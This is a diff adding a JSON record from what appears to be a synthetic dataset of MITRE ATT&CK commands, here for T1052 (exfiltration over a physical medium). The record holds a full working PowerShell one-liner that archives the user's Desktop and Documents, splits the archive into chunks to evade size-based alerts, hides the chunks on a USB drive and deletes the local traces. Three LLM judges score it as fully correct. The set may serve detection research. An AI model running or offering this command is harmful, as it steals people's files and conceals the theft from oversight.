@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$usb=(Get-Volume -DriveType Removable | Select -First 1 -ExpandProperty DriveLetter)+':\\'; $zip=\"$env:TEMP\\stage.zip\"; Compress-Archive -Path \"$env:USERPROFILE\\Desktop\\*\", \"$env:USERPROFILE\\Documents\\*\" -DestinationPath $zip -Force; $chunkDir=Join-Path $env:TEMP 'chunks'; New-Item -ItemType Directory -Force -Path $chunkDir | Out-Null; $b=[IO.File]::ReadAllBytes($zip); $size=4194304; for($i=0;$i -lt $b.Length;$i+=$size){ $end=[Math]::Min($i+$size,$b.Length); [IO.File]::WriteAllBytes((Join-Path $chunkDir (\"cache_{0:D3}.bin\" -f [int]($i/$size))), $b[$i..($end-1)]) }; $dst=Join-Path $usb '.cache'; New-Item -ItemType Directory -Force -Path $dst | Out-Null; (Get-Item $dst).Attributes='Hidden'; Copy-Item (Join-Path $chunkDir 'cache_*.bin') $dst -Force; Remove-Item $zip -Force; Remove-Item $chunkDir -Recurse -Force",
+  "explanation": "Archives targeted user data, splits into small chunks, and writes the pieces to a hidden folder on the USB using Copy-Item to blend with normal file sizes and reduce detection.",
+  "rationale_steps": [
+    "Find removable drive",
+    "Compress data for efficiency",
+    "Split archive into smaller chunks to evade size-based alerts",
+    "Create hidden destination on the USB",
+    "Copy chunks to USB using Copy-Item and remove staging files"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-1ea95c55-7419b2ba",
+  "source_prompt_hash": "1ea95c55",
+  "timestamp_utc": "2025-09-30T05:10:56.829613Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced quotes/braces, valid cmdlets/parameters, and proper separators; no apparent parsing issues.",
+        "semantic_score": 5,
+        "semantic_justification": "It archives Desktop/Documents, splits the archive into 4MB chunks, writes them to a hidden folder on a removable USB drive, and removes local artifacts, aligning with exfiltration over a physical medium.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T10:33:00.057976Z"
+      },
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, parentheses, and braces, proper command separators, valid PowerShell syntax throughout, and appropriate variable usage.",
+        "semantic_score": 5,
+        "semantic_justification": "The command fully implements T1052 by identifying a removable drive, compressing user data from Desktop and Documents, splitting it into chunks, hiding those chunks in a hidden directory on the USB drive, and cleaning up traces - all core behaviors of exfiltration over physical medium.",
+        "combined_score": 5.0,
+        "confidence": 0.95,
+        "timestamp": "2025-10-01T10:33:03.269460Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, with correct PowerShell syntax, balanced elements, valid cmdlets, proper variable assignments, and appropriate use of .NET methods.",
+        "semantic_score": 5,
+        "semantic_justification": "The command flawlessly executes the claimed intent of archiving data, splitting it into chunks, copying to a hidden folder on a removable drive, and cleaning up, directly aligning with all aspects of MITRE ATT&CK T1052 and its sub-behaviors.",
+        "combined_score": 5.0,
+        "confidence": 1,
+        "timestamp": "2025-10-01T10:33:16.308349Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 5.0,
+    "llm_average_score": 5.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
